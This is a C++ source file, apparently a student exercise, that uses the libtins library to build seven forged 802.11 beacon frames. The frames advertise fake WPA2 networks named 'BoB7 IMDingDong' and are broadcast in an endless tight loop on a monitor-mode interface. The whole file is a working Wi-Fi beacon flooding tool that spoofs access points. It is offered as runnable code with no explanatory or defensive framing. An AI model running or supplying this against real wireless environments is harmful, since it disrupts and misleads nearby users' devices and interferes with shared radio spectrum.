#include <iostream>
#include <tins/tins.h>
#include <unistd.h>

using namespace std;
using namespace Tins;

void usage() {
    printf("usage : ./beacon_flooding <interface>\n");
    printf("sample : ./beacon_flooding mon0\n");
}

int main(int argc,char * argv[])
{
    if (argc != 2) {
        usage();
        return -1;
    }

    RadioTap tap[7];
    Dot11Beacon beacon[7];
    PacketSender sender;

    beacon[0].addr1(Dot11::BROADCAST);
    beacon[0].addr2("00:01:02:03:04:05");
    beacon[0].addr3(beacon[0].addr2());
    beacon[0].ssid("BoB7 IMDingDong 1!");
    beacon[0].ds_parameter_set(8);
    beacon[0].supported_rates({1.0f, 5.5f, 11.0f});
    beacon[0].rsn_information(RSNInformation::wpa2_psk());

    beacon[1].addr1(Dot11::BROADCAST);
    beacon[1].addr2("06:07:08:09:0a:0b");
    beacon[1].addr3(beacon[1].addr2());
    beacon[1].ssid("BoB7 IMDingDong 2@");
    beacon[1].ds_parameter_set(8);
    beacon[1].supported_rates({1.0f, 5.5f, 11.0f});
    beacon[1].rsn_information(RSNInformation::wpa2_psk());

    beacon[2].addr1(Dot11::BROADCAST);
    beacon[2].addr2("01:23:45:67:89:ab");
    beacon[2].addr3(beacon[2].addr2());
    beacon[2].ssid("BoB7 IMDingDong 3#");
    beacon[2].ds_parameter_set(8);
    beacon[2].supported_rates({1.0f, 5.5f, 11.0f});
    beacon[2].rsn_information(RSNInformation::wpa2_psk());

    beacon[3].addr1(Dot11::BROADCAST);
    beacon[3].addr2("00:10:20:30:40:50");
    beacon[3].addr3(beacon[2].addr2());
    beacon[3].ssid("BoB7 IMDingDong 4$");
    beacon[3].ds_parameter_set(8);
    beacon[3].supported_rates({1.0f, 5.5f, 11.0f});
    beacon[3].rsn_information(RSNInformation::wpa2_psk());

    beacon[4].addr1(Dot11::BROADCAST);
    beacon[4].addr2("60:70:80:90:a0:b0");
    beacon[4].addr3(beacon[2].addr2());
    beacon[4].ssid("BoB7 IMDingDong 5%");
    beacon[4].ds_parameter_set(8);
    beacon[4].supported_rates({1.0f, 5.5f, 11.0f});
    beacon[4].rsn_information(RSNInformation::wpa2_psk());

    beacon[5].addr1(Dot11::BROADCAST);
    beacon[5].addr2("fe:dc:ba:98:76:54");
    beacon[5].addr3(beacon[2].addr2());
    beacon[5].ssid("BoB7 IMDingDong 6^");
    beacon[5].ds_parameter_set(8);
    beacon[5].supported_rates({1.0f, 5.5f, 11.0f});
    beacon[5].rsn_information(RSNInformation::wpa2_psk());

    beacon[6].addr1(Dot11::BROADCAST);
    beacon[6].addr2("12:34:56:78:90:ab");
    beacon[6].addr3(beacon[2].addr2());
    beacon[6].ssid("BoB7 IMDingDong 7&");
    beacon[6].ds_parameter_set(8);
    beacon[6].supported_rates({1.0f, 5.5f, 11.0f});
    beacon[6].rsn_information(RSNInformation::wpa2_psk());

    tap[0].inner_pdu(beacon[0]);
    tap[1].inner_pdu(beacon[1]);
    tap[2].inner_pdu(beacon[2]);
    tap[3].inner_pdu(beacon[3]);
    tap[4].inner_pdu(beacon[4]);
    tap[5].inner_pdu(beacon[5]);
    tap[6].inner_pdu(beacon[6]);

    NetworkInterface iface(argv[1]);

    while(1)
    {
        sender.send(tap[0], iface);
        sender.send(tap[1], iface);
        sender.send(tap[2], iface);
        sender.send(tap[3], iface);
        sender.send(tap[4], iface);
        sender.send(tap[5], iface);
        sender.send(tap[6], iface);
        usleep(200);	
    }

    return 0;
}
